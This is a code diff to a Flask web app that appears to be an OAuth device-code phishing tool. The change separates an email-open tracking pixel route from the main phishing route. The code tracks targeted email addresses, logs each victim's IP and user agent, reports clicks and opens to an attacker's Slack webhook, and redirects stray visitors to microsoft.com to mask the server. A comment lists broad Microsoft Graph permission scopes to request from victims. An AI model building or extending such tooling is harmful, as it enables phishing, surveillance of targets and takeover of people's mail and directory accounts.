@@ -49,31 +49,44 @@ def init_app(config: ConfigParser, emailer: Emailer) -> redirect:
         """Handle 404 errors here"""
         logging.error(f"Invalid URL request '{request.url}' from {request.headers.get('X-Forwarded-For')}")
         return redirect("https://microsoft.com/", code=302)
-
-    @app.route(route, methods=["GET"])
-    def run_devicecode_flow():
-        """Primary route handling for Flask app"""
-
+        
+    @app.route(route+"/tkimg", methods=["GET"])
+    def email_opened_tracker():
         # Get user information from the incoming request
         target_email = base64.b64decode(request.args.get("token")).decode('utf-8').strip()
-        if request.path.split('/')[-1] == "tkimg":
-            notify_slack(config.get("SLACK","WEBHOOK"),"Email Opened",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
-            return redirect("https://microsoft.com/", code=302)
-
-        
-        logging.info(f"{request.headers.get('X-Forwarded-For')} Target [{target_email}] arrived at URL: {request.url}")
-        notify_slack(config.get("SLACK","WEBHOOK"),"QR Accessed / Clicked Link",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
-
         if not target_email:
             logging.error(f"Could not retrieve target email address: '{request.url}' from {request.headers.get('X-Forwarded-For')}")  # fmt: skip
             return redirect("https://microsoft.com/", code=302)
-
         # Validate the email address since we use this value as a filename on
         # the system
         valid_email_regex = re.compile(r"^\b[A-Za-z0-9._#%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b$")  # fmt: skip
         if not re.fullmatch(valid_email_regex, target_email):
             logging.error(f"Invalid email address provided: '{request.url}' from {request.headers.get('X-Forwarded-For')}")  # fmt: skip
             return redirect("https://microsoft.com/", code=302)
+        
+        notify_slack(config.get("SLACK","WEBHOOK"),"Email Opened",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
+        return redirect("https://microsoft.com/", code=302)
+    
+    @app.route(route, methods=["GET"])
+    def run_devicecode_flow():
+        """Primary route handling for Flask app"""
+
+        # Get user information from the incoming request
+        target_email = base64.b64decode(request.args.get("token")).decode('utf-8').strip()
+        if not target_email:
+            logging.error(f"Could not retrieve target email address: '{request.url}' from {request.headers.get('X-Forwarded-For')}")  # fmt: skip
+            return redirect("https://microsoft.com/", code=302)
+        # Validate the email address since we use this value as a filename on
+        # the system
+        valid_email_regex = re.compile(r"^\b[A-Za-z0-9._#%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b$")  # fmt: skip
+        if not re.fullmatch(valid_email_regex, target_email):
+            logging.error(f"Invalid email address provided: '{request.url}' from {request.headers.get('X-Forwarded-For')}")  # fmt: skip
+            return redirect("https://microsoft.com/", code=302)
+        
+        logging.info(f"{request.headers.get('X-Forwarded-For')} Target [{target_email}] arrived at URL: {request.url}")
+        notify_slack(config.get("SLACK","WEBHOOK"),"QR Accessed / Clicked Link",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'))
+
+
 
         # Build the permissions scope
         # user.read mail.read contacts.read user.basic.all user.read.all directory.accessasuser.all application.readwrite.all
